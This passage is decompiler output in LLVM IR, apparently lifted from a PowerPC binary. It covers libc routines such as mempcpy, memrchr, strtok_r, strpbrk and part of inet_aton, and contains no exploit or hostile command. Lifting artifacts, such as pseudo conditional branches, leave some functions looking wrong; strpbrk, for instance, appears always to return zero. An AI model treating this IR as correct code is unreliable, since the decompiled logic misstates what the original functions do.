  %v4_100115d8 = zext i8 %v3_100115d8 to i32
  %v4_100115dc = icmp eq i32 %v4_100115d8, %v0_10011540
  br i1 %v4_100115dc, label %dec_label_pc_100115e4, label %dec_label_pc_100115ec.backedge

dec_label_pc_100115e4:                            ; preds = %dec_label_pc_100115d8
  ret i32 %v1_10011598

dec_label_pc_100115f0:                            ; preds = %dec_label_pc_100115ec.backedge, %dec_label_pc_10011540
  %v0_100115fc26 = phi i32 [ %v0_1001156816, %dec_label_pc_10011540 ], [ %v1_1001156c, %dec_label_pc_100115ec.backedge ]
  %v0_100115f0 = phi i32 [ %v0_10011544, %dec_label_pc_10011540 ], [ %v1_10011570, %dec_label_pc_100115ec.backedge ]
  %v1_100115f0 = add i32 %v0_100115f0, 1
  store i32 %v1_100115f0, i32* %r5.global-to-local, align 4
  store i32 %v0_100115f0, i32* %ctr.global-to-local, align 4
  %v2_1001160c3 = icmp eq i32 %v0_100115f0, 0
  br i1 %v2_1001160c3, label %dec_label_pc_10011610, label %dec_label_pc_100115fc

dec_label_pc_100115fc:                            ; preds = %dec_label_pc_100115f0, %dec_label_pc_100115fc.dec_label_pc_100115fc_crit_edge
  %v1_10011600 = phi i32 [ %v1_10011600.pre, %dec_label_pc_100115fc.dec_label_pc_100115fc_crit_edge ], [ %v0_10011540, %dec_label_pc_100115f0 ]
  %v0_100115fc = phi i32 [ %v1_10011608, %dec_label_pc_100115fc.dec_label_pc_100115fc_crit_edge ], [ %v0_100115fc26, %dec_label_pc_100115f0 ]
  %v1_100115fc = inttoptr i32 %v0_100115fc to i8*
  %v2_100115fc = load i8, i8* %v1_100115fc, align 1
  %v3_100115fc = zext i8 %v2_100115fc to i32
  %v4_10011600 = icmp eq i32 %v3_100115fc, %v1_10011600
  %v0_10011604 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011600, i32 %v0_10011604)
  %v0_10011608 = load i32, i32* @r3, align 4
  %v1_10011608 = add i32 %v0_10011608, 1
  store i32 %v1_10011608, i32* @r3, align 4
  %v0_1001160c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001160c = add i32 %v0_1001160c, -1
  store i32 %v1_1001160c, i32* %ctr.global-to-local, align 4
  %v2_1001160c = icmp eq i32 %v1_1001160c, 0
  br i1 %v2_1001160c, label %dec_label_pc_10011610, label %dec_label_pc_100115fc.dec_label_pc_100115fc_crit_edge

dec_label_pc_100115fc.dec_label_pc_100115fc_crit_edge: ; preds = %dec_label_pc_100115fc
  %v1_10011600.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100115fc

dec_label_pc_10011610:                            ; preds = %dec_label_pc_100115fc, %dec_label_pc_100115f0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1001160c, { 1, 0 }
  uselistorder i32 %v1_10011608, { 1, 0 }
  uselistorder i32 %v0_100115f0, { 1, 2, 0 }
  uselistorder i32 %v1_100115ec, { 2, 1, 0 }
  uselistorder i32 %v1_10011570, { 0, 2, 1 }
  uselistorder i32 %v1_1001156c, { 0, 2, 1 }
  uselistorder i32 %v0_100115a8, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10011548, { 1, 0 }
  uselistorder i32 %v1_10011544, { 1, 0 }
  uselistorder i32 %v0_1001156816, { 1, 0 }
  uselistorder i32 %v0_10011540, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10011544, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10011538, { 1, 0 }
  uselistorder i32 %v1_10011530, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100115347, { 2, 0, 1 }
  uselistorder i32 %v1_10011514, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100115fc, { 1, 0 }
  uselistorder label %dec_label_pc_100115ec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10011568, { 1, 0 }
  uselistorder label %dec_label_pc_1001153c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268506676, i32* @lr, align 4
  %v0_10011630 = call i32 @memcpy()
  %v0_10011638 = load i32, i32* @r28, align 4
  %v1_10011638 = load i32, i32* @r29, align 4
  %v2_10011638 = add i32 %v1_10011638, %v0_10011638
  ret i32 %v2_10011638
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10011650 = urem i32 %arg2, 256
  store i32 %v1_10011650, i32* %r4.global-to-local, align 4
  %v2_10011658 = add i32 %arg3, %arg1
  store i32 %v2_10011658, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1001167413 = icmp eq i32 %arg3, 0
  br i1 %v2_1001167413, label %dec_label_pc_1001167c, label %dec_label_pc_10011678

dec_label_pc_10011660:                            ; preds = %dec_label_pc_10011678
  %v1_10011660 = add i32 %v0_10011660, -1
  %v2_10011660 = inttoptr i32 %v1_10011660 to i8*
  %v3_10011660 = load i8, i8* %v2_10011660, align 1
  %v4_10011660 = zext i8 %v3_10011660 to i32
  store i32 %v1_10011660, i32* %r3.global-to-local, align 4
  %v0_10011664 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011664 = add i32 %v0_10011664, -1
  store i32 %v1_10011664, i32* %r5.global-to-local, align 4
  %v1_10011668 = load i32, i32* %r4.global-to-local, align 4
  %v4_10011668 = icmp eq i32 %v4_10011660, %v1_10011668
  %v0_1001166c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011668, i32 %v0_1001166c)
  %v0_10011670 = load i32, i32* %r3.global-to-local, align 4
  %v0_10011674 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011674 = add i32 %v0_10011674, -1
  store i32 %v1_10011674, i32* %ctr.global-to-local, align 4
  %v2_10011674 = icmp eq i32 %v1_10011674, 0
  br i1 %v2_10011674, label %dec_label_pc_1001167c.loopexit, label %dec_label_pc_10011678

dec_label_pc_10011678:                            ; preds = %entry, %dec_label_pc_10011660
  %v0_10011660 = phi i32 [ %v0_10011670, %dec_label_pc_10011660 ], [ %v2_10011658, %entry ]
  %v0_10011678.in.in = phi i32 [ %v0_10011670, %dec_label_pc_10011660 ], [ %v2_10011658, %entry ]
  %v0_10011678.in = urem i32 %v0_10011678.in.in, 4
  %v0_10011678 = icmp eq i32 %v0_10011678.in, 0
  br i1 %v0_10011678, label %dec_label_pc_1001167c.loopexit, label %dec_label_pc_10011660

dec_label_pc_1001167c.loopexit:                   ; preds = %dec_label_pc_10011678, %dec_label_pc_10011660
  %v0_100116a416.ph = phi i32 [ %v0_10011670, %dec_label_pc_10011660 ], [ %v0_10011660, %dec_label_pc_10011678 ]
  %v0_1001167c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10011680.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001167c

dec_label_pc_1001167c:                            ; preds = %dec_label_pc_1001167c.loopexit, %entry
  %v0_10011680 = phi i32 [ 0, %entry ], [ %v0_10011680.pre, %dec_label_pc_1001167c.loopexit ]
  %v0_1001167c = phi i32 [ %v1_10011650, %entry ], [ %v0_1001167c.pre, %dec_label_pc_1001167c.loopexit ]
  %v0_100116a416 = phi i32 [ %v2_10011658, %entry ], [ %v0_100116a416.ph, %dec_label_pc_1001167c.loopexit ]
  %v1_1001167c = mul i32 %v0_1001167c, 256
  %v1_10011680 = udiv i32 %v0_10011680, 4
  %v2_10011684 = or i32 %v1_1001167c, %v0_1001167c
  %v1_1001168c = mul i32 %v2_10011684, 65536
  %v2_10011698 = or i32 %v1_1001168c, %v2_10011684
  store i32 %v2_10011698, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10011680, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10011680, 4
  br i1 %tmp, label %dec_label_pc_1001171c, label %dec_label_pc_100116a4

dec_label_pc_100116a4:                            ; preds = %dec_label_pc_1001167c, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge
  %v0_1001171821 = phi i32 [ %v1_10011718, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge ], [ %v1_10011680, %dec_label_pc_1001167c ]
  %v0_100116c4 = phi i32 [ %v0_100116c4.pre, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge ], [ -2130640640, %dec_label_pc_1001167c ]
  %v0_100116ac = phi i32 [ %v0_100116ac.pre, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge ], [ %v2_10011698, %dec_label_pc_1001167c ]
  %v0_100116a8 = phi i32 [ %v0_100116a8.pre, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge ], [ %v0_10011680, %dec_label_pc_1001167c ]
  %v0_100116a4 = phi i32 [ %v0_100116a4.pre, %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge ], [ %v0_100116a416, %dec_label_pc_1001167c ]
  %v1_100116a4 = add i32 %v0_100116a4, -4
  %v2_100116a4 = inttoptr i32 %v1_100116a4 to i32*
  %v3_100116a4 = load i32, i32* %v2_100116a4, align 4
  store i32 %v1_100116a4, i32* %r3.global-to-local, align 4
  %v1_100116a8 = add i32 %v0_100116a8, -4
  store i32 %v1_100116a8, i32* %r5.global-to-local, align 4
  %v2_100116ac = xor i32 %v3_100116a4, %v0_100116ac
  %v1_100116b0 = add i32 %v0_100116a4, -3
  %v1_100116b8 = add i32 %v2_100116ac, 2130640639
  %v1_100116c0 = add i32 %v0_100116a4, -2
  %v2_100116bc = sub i32 -1, %v2_100116ac
  %v2_100116c4 = xor i32 %v1_100116b8, %v2_100116bc
  %v3_100116c4 = and i32 %v2_100116c4, %v0_100116c4
  %v6_100116c4 = icmp eq i32 %v3_100116c4, 0
  %v1_100116c8 = add i32 %v0_100116a4, -1
  br i1 %v6_100116c4, label %dec_label_pc_10011718.backedge, label %dec_label_pc_100116d0

dec_label_pc_100116d0:                            ; preds = %dec_label_pc_100116a4
  %v2_100116d0 = inttoptr i32 %v1_100116c8 to i8*
  %v3_100116d0 = load i8, i8* %v2_100116d0, align 1
  %v4_100116d0 = zext i8 %v3_100116d0 to i32
  %v1_100116d4 = load i32, i32* %r4.global-to-local, align 4
  %v4_100116d4 = icmp eq i32 %v4_100116d0, %v1_100116d4
  br i1 %v4_100116d4, label %dec_label_pc_100116dc, label %dec_label_pc_100116e4

dec_label_pc_100116dc:                            ; preds = %dec_label_pc_100116d0
  store i32 %v1_100116c8, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116c8

dec_label_pc_100116e4:                            ; preds = %dec_label_pc_100116d0
  %v2_100116e4 = inttoptr i32 %v1_100116c0 to i8*
  %v3_100116e4 = load i8, i8* %v2_100116e4, align 1
  %v4_100116e4 = zext i8 %v3_100116e4 to i32
  %v4_100116e8 = icmp eq i32 %v4_100116e4, %v1_100116d4
  br i1 %v4_100116e8, label %dec_label_pc_100116f0, label %dec_label_pc_100116f8

dec_label_pc_100116f0:                            ; preds = %dec_label_pc_100116e4
  store i32 %v1_100116c0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116c0

dec_label_pc_100116f8:                            ; preds = %dec_label_pc_100116e4
  %v2_100116f8 = inttoptr i32 %v1_100116b0 to i8*
  %v3_100116f8 = load i8, i8* %v2_100116f8, align 1
  %v4_100116f8 = zext i8 %v3_100116f8 to i32
  %v4_100116fc = icmp eq i32 %v4_100116f8, %v1_100116d4
  br i1 %v4_100116fc, label %dec_label_pc_10011704, label %dec_label_pc_1001170c

dec_label_pc_10011704:                            ; preds = %dec_label_pc_100116f8
  store i32 %v1_100116b0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116b0

dec_label_pc_1001170c:                            ; preds = %dec_label_pc_100116f8
  %v1_1001170c = inttoptr i32 %v1_100116a4 to i8*
  %v2_1001170c = load i8, i8* %v1_1001170c, align 1
  %v3_1001170c = zext i8 %v2_1001170c to i32
  %v4_10011710 = icmp eq i32 %v3_1001170c, %v1_100116d4
  %v0_10011714 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011710, i32 %v0_10011714)
  %v0_10011718.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10011718.backedge

dec_label_pc_10011718.backedge:                   ; preds = %dec_label_pc_1001170c, %dec_label_pc_100116a4
  %v0_10011718 = phi i32 [ %v0_10011718.pre, %dec_label_pc_1001170c ], [ %v0_1001171821, %dec_label_pc_100116a4 ]
  %v1_10011718 = add i32 %v0_10011718, -1
  store i32 %v1_10011718, i32* %ctr.global-to-local, align 4
  %v2_10011718 = icmp eq i32 %v1_10011718, 0
  br i1 %v2_10011718, label %dec_label_pc_10011718.dec_label_pc_1001171c_crit_edge, label %dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge

dec_label_pc_10011718.backedge.dec_label_pc_100116a4_crit_edge: ; preds = %dec_label_pc_10011718.backedge
  %v0_100116a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100116a8.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100116ac.pre = load i32, i32* @r7, align 4
  %v0_100116c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100116a4

dec_label_pc_10011718.dec_label_pc_1001171c_crit_edge: ; preds = %dec_label_pc_10011718.backedge
  %v0_1001171c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001171c

dec_label_pc_1001171c:                            ; preds = %dec_label_pc_10011718.dec_label_pc_1001171c_crit_edge, %dec_label_pc_1001167c
  %v0_1001171c = phi i32 [ %v0_1001171c.pre, %dec_label_pc_10011718.dec_label_pc_1001171c_crit_edge ], [ %v0_10011680, %dec_label_pc_1001167c ]
  %v1_1001171c = add i32 %v0_1001171c, 1
  store i32 %v1_1001171c, i32* %r5.global-to-local, align 4
  store i32 %v0_1001171c, i32* %ctr.global-to-local, align 4
  %v2_100117343 = icmp eq i32 %v0_1001171c, 0
  br i1 %v2_100117343, label %dec_label_pc_10011738, label %dec_label_pc_10011728

dec_label_pc_10011728:                            ; preds = %dec_label_pc_1001171c, %dec_label_pc_10011728
  %v0_10011728 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011728 = add i32 %v0_10011728, -1
  %v2_10011728 = inttoptr i32 %v1_10011728 to i8*
  %v3_10011728 = load i8, i8* %v2_10011728, align 1
  %v4_10011728 = zext i8 %v3_10011728 to i32
  store i32 %v1_10011728, i32* %r3.global-to-local, align 4
  %v1_1001172c = load i32, i32* %r4.global-to-local, align 4
  %v4_1001172c = icmp eq i32 %v4_10011728, %v1_1001172c
  %v0_10011730 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001172c, i32 %v0_10011730)
  %v0_10011734 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011734 = add i32 %v0_10011734, -1
  store i32 %v1_10011734, i32* %ctr.global-to-local, align 4
  %v2_10011734 = icmp eq i32 %v1_10011734, 0
  br i1 %v2_10011734, label %dec_label_pc_10011738, label %dec_label_pc_10011728

dec_label_pc_10011738:                            ; preds = %dec_label_pc_10011728, %dec_label_pc_1001171c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10011734, { 1, 0 }
  uselistorder i32 %v0_1001171c, { 1, 2, 0 }
  uselistorder i32 %v1_10011718, { 2, 1, 0 }
  uselistorder i32 %v1_100116c8, { 1, 0, 2 }
  uselistorder i32 %v1_100116c0, { 1, 0, 2 }
  uselistorder i32 %v1_100116b0, { 1, 0, 2 }
  uselistorder i32 %v2_10011684, { 1, 0 }
  uselistorder i32 %v1_10011680, { 1, 0 }
  uselistorder i32 %v0_1001167c, { 1, 0 }
  uselistorder i32 %v0_10011680, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10011674, { 1, 0 }
  uselistorder i32 %v0_10011670, { 1, 0, 2 }
  uselistorder i32 %v2_10011658, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10011650, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10011728, { 1, 0 }
  uselistorder label %dec_label_pc_100116a4, { 1, 0 }
  uselistorder label %dec_label_pc_10011678, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10011744 = load i32, i32* @lr, align 4
  store i32 %v0_10011744, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1001174c = icmp eq i32 %arg1, 0
  %v0_10011754 = load i32, i32* @r5, align 4
  store i32 %v0_10011754, i32* %r30.global-to-local, align 4
  %v0_10011758 = load i32, i32* @r4, align 4
  store i32 %v0_10011758, i32* %r29.global-to-local, align 4
  br i1 %v3_1001174c, label %dec_label_pc_10011760, label %dec_label_pc_10011764

dec_label_pc_10011760:                            ; preds = %entry
  %v1_10011760 = inttoptr i32 %v0_10011754 to i32*
  %v2_10011760 = load i32, i32* %v1_10011760, align 4
  store i32 %v2_10011760, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011764

dec_label_pc_10011764:                            ; preds = %entry, %dec_label_pc_10011760
  %v0_10011764 = phi i32 [ %arg1, %entry ], [ %v2_10011760, %dec_label_pc_10011760 ]
  store i32 %v0_10011764, i32* @r3, align 4
  %v1_10011768 = inttoptr i32 %v0_10011764 to i8*
  %v2_10011768 = call i32 @__GI_strspn(i8* %v1_10011768)
  %v0_1001176c = load i32, i32* %r29.global-to-local, align 4
  %v0_10011770 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011770 = add i32 %v0_10011770, %v2_10011768
  %v3_10011770 = inttoptr i32 %v2_10011770 to i8*
  %v4_10011770 = load i8, i8* %v3_10011770, align 1
  store i32 %v2_10011770, i32* @r31, align 4
  store i32 %v2_10011770, i32* @r3, align 4
  %v3_1001177c = icmp eq i8 %v4_10011770, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1001177c, label %dec_label_pc_10011788, label %dec_label_pc_10011790

dec_label_pc_10011788:                            ; preds = %dec_label_pc_10011764
  %v1_10011788 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011788 = inttoptr i32 %v1_10011788 to i32*
  store i32 %v2_10011770, i32* %v2_10011788, align 4
  br label %dec_label_pc_100117c8

dec_label_pc_10011790:                            ; preds = %dec_label_pc_10011764
  store i32 268507028, i32* @lr, align 4
  %v3_10011790 = call i32 @__GI_strpbrk(i8* %v3_10011770, i32 %v0_1001176c)
  %v4_10011798 = icmp eq i32 %v3_10011790, 0
  %v0_1001179c = load i32, i32* @r31, align 4
  store i32 %v0_1001179c, i32* @r3, align 4
  %v2_100117a0 = add i32 %v3_10011790, 1
  store i32 %v2_100117a0, i32* %r11.global-to-local, align 4
  br i1 %v4_10011798, label %dec_label_pc_100117a8, label %dec_label_pc_100117b8

dec_label_pc_100117a8:                            ; preds = %dec_label_pc_10011790
  store i32 268507052, i32* @lr, align 4
  %v4_100117a8 = call i32 @rawmemchr(i32 %v0_1001179c, i32 0, i32 0)
  %v0_100117ac = load i32, i32* @r31, align 4
  store i32 %v0_100117ac, i32* %r0.global-to-local, align 4
  %v1_100117b0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100117b0 = inttoptr i32 %v1_100117b0 to i32*
  store i32 %v4_100117a8, i32* %v2_100117b0, align 4
  br label %dec_label_pc_100117c8

dec_label_pc_100117b8:                            ; preds = %dec_label_pc_10011790
  %v1_10011798 = inttoptr i32 %v3_10011790 to i8*
  store i8 0, i8* %v1_10011798, align 1
  %v0_100117c0 = load i32, i32* @r31, align 4
  store i32 %v0_100117c0, i32* %r0.global-to-local, align 4
  %v0_100117c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100117c4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100117c4 = inttoptr i32 %v1_100117c4 to i32*
  store i32 %v0_100117c4, i32* %v2_100117c4, align 4
  br label %dec_label_pc_100117c8

dec_label_pc_100117c8:                            ; preds = %dec_label_pc_100117a8, %dec_label_pc_10011788, %dec_label_pc_100117b8
  %v0_100117c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10011744, i32* %r0.global-to-local, align 4
  ret i32 %v0_100117c8

; uselistorder directives
  uselistorder i32 %v3_10011790, { 2, 0, 1 }
  uselistorder i32 %v2_10011770, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10011764, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_100117c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011764, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100118001 = load i32, i32* @r3, align 4
  %v1_100118002 = inttoptr i32 %v0_100118001 to i8*
  %v2_100118003 = load i8, i8* %v1_100118002, align 1
  %v3_100118004 = zext i8 %v2_100118003 to i32
  store i32 %v3_100118004, i32* %r11.global-to-local, align 4
  %v3_100118046 = icmp eq i8 %v2_100118003, 0
  br i1 %v3_100118046, label %dec_label_pc_10011814, label %dec_label_pc_1001180c

dec_label_pc_100117e4:                            ; preds = %dec_label_pc_100117e8
  %v3_100117e8 = zext i8 %v2_100117e8 to i32
  %v4_100117f4 = icmp eq i32 %v3_100117e8, %v1_100117f4
  %v0_100117e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100117f4, i32 %v0_100117e4)
  %v0_100117e8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100117f4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100117e8

dec_label_pc_100117e8:                            ; preds = %dec_label_pc_1001180c, %dec_label_pc_100117e4
  %v1_100117f4 = phi i32 [ %v1_100117f49, %dec_label_pc_1001180c ], [ %v1_100117f4.pre, %dec_label_pc_100117e4 ]
  %v0_100117e8 = phi i32 [ %tmp, %dec_label_pc_1001180c ], [ %v0_100117e8.pre, %dec_label_pc_100117e4 ]
  %v1_100117e8 = inttoptr i32 %v0_100117e8 to i8*
  %v2_100117e8 = load i8, i8* %v1_100117e8, align 1
  %v1_100117ec = add i32 %v0_100117e8, 1
  store i32 %v1_100117ec, i32* %r9.global-to-local, align 4
  %v3_100117f0 = icmp eq i8 %v2_100117e8, 0
  br i1 %v3_100117f0, label %dec_label_pc_100117fc, label %dec_label_pc_100117e4

dec_label_pc_100117fc:                            ; preds = %dec_label_pc_100117e8
  %v0_100117fc = load i32, i32* @r3, align 4
  %v1_100117fc = add i32 %v0_100117fc, 1
  store i32 %v1_100117fc, i32* @r3, align 4
  %v1_10011800 = inttoptr i32 %v1_100117fc to i8*
  %v2_10011800 = load i8, i8* %v1_10011800, align 1
  %v3_10011800 = zext i8 %v2_10011800 to i32
  store i32 %v3_10011800, i32* %r11.global-to-local, align 4
  %v3_10011804 = icmp eq i8 %v2_10011800, 0
  br i1 %v3_10011804, label %dec_label_pc_10011814, label %dec_label_pc_1001180c

dec_label_pc_1001180c:                            ; preds = %entry, %dec_label_pc_100117fc
  %v1_100117f49 = phi i32 [ %v3_10011800, %dec_label_pc_100117fc ], [ %v3_100118004, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100117e8

dec_label_pc_10011814:                            ; preds = %dec_label_pc_100117fc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100117e8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001180c, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1001181c = icmp eq i8* %arg1, null
  br i1 %v3_1001181c, label %dec_label_pc_100118d4, label %dec_label_pc_10011824

dec_label_pc_10011824:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10011838.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10011834

dec_label_pc_10011834:                            ; preds = %dec_label_pc_10011824, %dec_label_pc_100118ac
  %v0_100118ac = phi i32 [ 0, %dec_label_pc_10011824 ], [ %v2_100118b4, %dec_label_pc_100118ac ]
  %v0_100118b0 = phi i32 [ 1, %dec_label_pc_10011824 ], [ %v1_100118b0, %dec_label_pc_100118ac ]
  %v0_10011834 = phi i32 [ %tmp, %dec_label_pc_10011824 ], [ %v0_100118343, %dec_label_pc_100118ac ]
  %v1_10011834 = inttoptr i32 %v0_10011834 to i8*
  %v2_10011834 = load i8, i8* %v1_10011834, align 1
  %v3_10011834 = zext i8 %v2_10011834 to i32
  %v1_1001183c = mul nuw nsw i32 %v3_10011834, 2
  %v2_10011840 = add i32 %v1_1001183c, %v3_10011838.pre
  %v3_10011840 = inttoptr i32 %v2_10011840 to i16*
  %v4_10011840 = load i16, i16* %v3_10011840, align 2
  %v1_10011844 = and i16 %v4_10011840, 8
  %v3_10011844 = icmp eq i16 %v1_10011844, 0
  br i1 %v3_10011844, label %dec_label_pc_100118d4, label %dec_label_pc_1001184c

dec_label_pc_1001184c:                            ; preds = %dec_label_pc_10011834
  br label %dec_label_pc_10011864

dec_label_pc_10011854:                            ; preds = %dec_label_pc_10011864
  %v1_10011868 = mul i32 %v1_100118b4, 10
  %v2_10011870 = add i32 %v3_10011864, %v1_10011868
  %v1_10011854 = add i32 %v2_10011870, -48
  %v1_10011858 = add i32 %v0_1001189c, 1
  %v2_1001185c = icmp sgt i32 %v1_10011854, 255
  br i1 %v2_1001185c, label %dec_label_pc_100118d4, label %dec_label_pc_10011864

dec_label_pc_10011864:                            ; preds = %dec_label_pc_10011854, %dec_label_pc_1001184c
  %v1_100118b4 = phi i32 [ %v1_10011854, %dec_label_pc_10011854 ], [ 0, %dec_label_pc_1001184c ]
  %v0_1001189c = phi i32 [ %v1_10011858, %dec_label_pc_10011854 ], [ %v0_10011834, %dec_label_pc_1001184c ]
  %v1_10011864 = inttoptr i32 %v0_1001189c to i8*
  %v2_10011864 = load i8, i8* %v1_10011864, align 1
  %v3_10011864 = zext i8 %v2_10011864 to i32
  %v1_1001186c = mul nuw nsw i32 %v3_10011864, 2
  %v2_10011874 = add i32 %v1_1001186c, %v3_10011838.pre
  %v3_10011874 = inttoptr i32 %v2_10011874 to i16*
  %v4_10011874 = load i16, i16* %v3_10011874, align 2
  %v5_10011874 = zext i16 %v4_10011874 to i32
  %v1_10011878 = and i32 %v5_10011874, 8
  %v3_10011878 = icmp eq i32 %v1_10011878, 0
  br i1 %v3_10011878, label %dec_label_pc_10011880, label %dec_label_pc_10011854

dec_label_pc_10011880:                            ; preds = %dec_label_pc_10011864
  %v2_10011880 = icmp sgt i32 %v0_100118b0, 3
  br i1 %v2_10011880, label %dec_label_pc_10011898, label %dec_label_pc_10011888

dec_label_pc_10011888:                            ; preds = %dec_label_pc_10011880
  %v3_10011888 = icmp eq i8 %v2_10011864, 46
  br i1 %v3_10011888, label %dec_label_pc_10011890, label %dec_label_pc_100118d4

dec_label_pc_10011890:                            ; preds = %dec_label_pc_10011888
  %v1_10011890 = add i32 %v0_1001189c, 1
  br label %dec_label_pc_100118ac

dec_label_pc_10011898:                            ; preds = %dec_label_pc_10011880
  %v3_10011898 = icmp eq i8 %v2_10011864, 0
  %v1_1001189c = add i32 %v0_1001189c, 1
  br i1 %v3_10011898, label %dec_label_pc_100118ac, label %dec_label_pc_100118a4

dec_label_pc_100118a4:                            ; preds = %dec_label_pc_10011898
  %v1_100118a4 = and i32 %v5_10011874, 32
  %v3_100118a4 = icmp eq i32 %v1_100118a4, 0
  br i1 %v3_100118a4, label %dec_label_pc_100118d4, label %dec_label_pc_100118ac

dec_label_pc_100118ac:                            ; preds = %dec_label_pc_100118a4, %dec_label_pc_10011898, %dec_label_pc_10011890
  %v0_100118343 = phi i32 [ %v1_1001189c, %dec_label_pc_100118a4 ], [ %v1_1001189c, %dec_label_pc_10011898 ], [ %v1_10011890, %dec_label_pc_10011890 ]
  %v1_100118ac = mul i32 %v0_100118ac, 256
  %v1_100118b0 = add nuw nsw i32 %v0_100118b0, 1
